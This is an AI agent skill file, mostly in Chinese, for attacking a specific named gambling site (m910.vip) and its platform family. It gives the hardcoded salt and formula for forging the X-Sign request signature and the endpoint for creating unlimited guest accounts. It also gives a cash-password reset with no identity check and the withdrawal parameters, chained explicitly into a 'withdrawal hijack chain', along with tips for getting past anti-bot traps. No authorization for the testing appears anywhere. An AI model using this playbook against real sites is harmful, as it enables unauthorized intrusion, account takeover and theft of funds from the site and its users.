---
name: 商燕飞·盒盘
description: "HSBox: X-Sign MD5 forge, guest login, cash-pwd takeover."
version: 1.0.0
author: bot4
license: MIT
platforms: [linux]
metadata:
    tags: [gambling, xsign, hsbox, spring-webflux, pentest, daaixianzun]
    category: daaixianzun
---

> **商燕飞**
> 商道无亲利字先，一城风雨一城钱。
> 燕飞南北皆为市，账本比剑更锋寒。

# HSBox-family 博彩站渗透 (M9体育/m910.vip 家族)

Use when the target is a gambling SPA identified by: Spring WebFlux multi-service gateway under `/api/<svc>/*`, request headers `X-Sign/X-Timestamp/X-UDID/domainName/os/tenantSys`, auth `Authorization: HSBox <token>`, React+antd build with `app-shell.<hash>.chunk.js` + `lib-skey-crypto`.

## 1. Fingerprint (fast)
- `dig m910.vip` → CNAME `afdfqlwd.glowale.com` (glowale family brand dir `config/m9sport/`)
- SPA: `/bootstrap-config.<hash>.js` (anti-bot traps: `get_secret_tokens`, `/.well-known/admin-console`, `/_private/config.json`), `/js/runtime.*.js` (chunk map), `/js/app.*.js` (entry), `app-shell.<hash>.chunk.js` (business API)
- Chunk URL format: `js/<id>.<hash>.chunk.js`; named chunks `js/<name>.<hash>.chunk.js`
- 后端错误特征: `org.springframework.web.server.ResponseStatusException` (WebFlux), `Redisson` (Redis)

## 2. 签名绕过 (P0) — X-Sign 弱签名
```
X-Sign = MD5( X-UDID + "jgyh,kasd" + X-Timestamp_ms )
```
- 盐 `jgyh,kasd` 硬编码在 app-shell chunk。签名与请求体、token 无关。
- 必要 header: `X-UDID`, `X-Timestamp`, `X-Sign`, `X-Language: zh-CN`, `tenantSys`(数字字符串如 "1"), `domainName: https://<host>`, **`os` 必须是数字** (os="web" → NumberFormatException "web").
- 离线 python 复刻后即可伪造签名过网关调任意公开接口 (无需 token)。
- 完整 client 参考: `./data/m910-vip/m9.py` (sign+call+guest login)

## 3. 无限游客账号 (P1)
```
POST /api/user/sys/auth/touristLogin  body {"udid":"<any>"}
-> {code:200, data:{token, uid, nickname}}  # uid 递增, 免验证码/注册
```
- 游客 token 时效短 (几分钟) — 每轮业务调用前先重新 touristLogin 刷新。
- 业务接口仍需 token: 无 token → 401 / "Login expired"; 签名绕过 ≠ token 绕过。

## 4. 资金密码接管 (P1)
```
POST /api/user/sys/user/setCashPwd  {"password":"<6位>"}   # 字段名=password
-> success (无旧密码/身份校验)
POST /api/user/sys/user/checkCashPwd {"password":"..."} -> {data:"SUCC"}
```
- 提现 `POST /api/pay-withdraw/user/withdraw/currency/userCurWithdrawV2` 参数: `currency, withdrawalValue, withdrawalJson, cashPassword, currencyId`.
- 组合: 签名绕过 + 无限游客 + 资金密码接管 = 提现劫持链组件。

## 5. 多服务网关前缀映射 (g.i, from app-shell)
```
activityPromotion:/activity configClient:/pre user:/user
serviceBusinessPay2:/pay-recharge serviceBusinessPay3:/pay-withdraw serviceBusinessPay1:/pay-callback
serviceBusinessAgent:/agent serviceBusinessAssets:/asset
serviceGameClient:/gt-game-client serviceGameQuery:/gt-game-query serviceGameAnalyze:/gt-game-analyze
gw:/gw jobClient:/job liveAdmin:/admin dwExport:/dw-export ...
完整 URL = /api + <prefix> + <path>
```
- 提取: grep app-shell 里 `concat(a.i.<KEY>,"<path>")`, KEY 映射见模块 `63473` 导出对象。

## 6. 其它端点（攻击面）
- 充值 `POST /api/pay-recharge/user/pay/currency/curUserPayV2` (isSkey:!0; 参数 currency+currencyId+amount 达接口; 频控 4037 "Frequent operations")
- 提现渠道 `withdrawNum?payTypeId=`、通道 `queryPayTypeCurrencyV2 {currency,currencyId}` (该租户[]空)
- 活动免费余额(签到/红包/返水/福利)对游客/该租户多返回 2075 "The event has been closed"

## 7. Pitfalls
- 反爬 traps 会给诱饵响应 — 用真实 stealth 浏览器(非 headless)收集资源/API 更可靠。
- token 多用单会话串联调用, 间隔 sleep(0.3+).
- 诚实评估: 游客 0 余额 + 充值通道空时, 资金套利闭环无法实现; 报告如实标注, 别夸大。

## References
- `./data/m910-vip/REPORT.md`, `NOTES.md` (证据), `m9.py` (工具)
